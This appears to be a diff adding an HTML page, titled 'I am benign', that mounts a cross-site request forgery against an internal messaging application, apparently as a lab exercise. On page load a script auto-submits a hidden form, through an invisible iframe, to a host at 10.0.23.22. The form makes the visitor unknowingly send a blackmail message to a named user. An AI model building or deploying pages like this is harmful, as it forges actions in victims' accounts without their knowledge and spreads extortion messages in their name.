@@ -1,0 +1,24 @@
+<head>
+       <title>I am benign</title>
+       <meta charset="utf-8"/>
+</head>
+<body>
+<center>
+<img src="http://lifelettercafe.com/wp-content/uploads/2017/01/trust-me.jpg" width="412px" height="274px;">
+</center>
+ <!--We create a "dummy" iframe and use it so the page won't redirect us after sending a message -->
+<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+ <!--This is the form for sending the message. We set the target of the form to be the dummy iframe.-->
+<!--We set the value of the message to what we want to send, and tha value of the subject to what we want the subject to be-->
+ <form id="myForm" type="hidden" action="http://10.0.23.22/myspray/writemessage92.html" method="POST" target="dummyframe">
+  <input type="hidden" id="Messages_subject" name="subject" value="Blackmail" class="fieldText" maxlength="70" type="text"><br>
+  <input type="hidden" id="Messages_message" name="message" value="Hello there my dear friend. I would invite you to colaborate on my campaign to raise funds to make me a millionaire. I would like to kindly remind you that I was there on that thay (you know when). If you do not want to have all that happened revealed, I hope we can get to an agreement. Sincerely, your friend"></textarea><br>
+</form>
+
+ <!--Here we submit the form, and the message is sent to Hanni Ball-->
+<script>
+    document.getElementById("myForm").submit();
+</script>
+
+
+</body>
